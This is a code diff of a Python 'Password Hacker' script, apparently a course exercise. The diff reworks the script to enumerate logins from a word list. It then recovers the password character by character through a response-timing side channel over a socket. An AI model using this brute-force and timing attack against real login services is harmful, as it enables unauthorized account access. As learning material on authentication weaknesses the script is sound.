@@ -1,7 +1,9 @@
 import sys
-import itertools
 import json
+import time
+import itertools
 
+from datetime import datetime
 from Connection import connect
 
 login_file_path = "C:\\Users\\longr\\OneDrive\\Документы\\Python\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt"
@@ -25,7 +27,7 @@ with open(login_file_path, "r") as file, open("log.txt", "w") as log:
             if "Wrong login" not in dict_response["result"]:
                 log.write(str(json_request) + " ")
                 log.writelines(str(dict_response) + "\n")
-            if "Exception" in dict_response["result"]:
+            if "Wrong password" in dict_response["result"]:
                 login = "".join(iter)
                 break
 
@@ -36,18 +38,20 @@ with open(login_file_path, "r") as file, open("log.txt", "w") as log:
         for i in range(48, 126):
             password.append(chr(i))
             json_request = json.dumps({"login": login, "password": "".join(password)})
+            start = datetime.now()
             client_socket.send(json_request.encode())
             dict_response = json.loads(client_socket.recv(1024).decode())
-            if "Wrong password" not in dict_response["result"]:
-                log.write(str(json_request) + " ")
-                log.write(dict_response["result"] + "\n")
+            end = datetime.now()
+            total = end - start
+            log.write(str(json_request) + " ")
+            log.write(dict_response["result"] + "\n")
+            log.write("total: " + str((end - start).total_seconds()) + "\n")
             if "success" in dict_response["result"]:
                 print(json_request)
                 client_socket.close()
                 exit(0)
-            elif "Exception" in dict_response["result"]:
+            elif "Wrong password" in dict_response["result"] and (end - start).total_seconds() >= 0.1:
                 counter += 1
                 break
             else:
                 password = password[:-1]
-
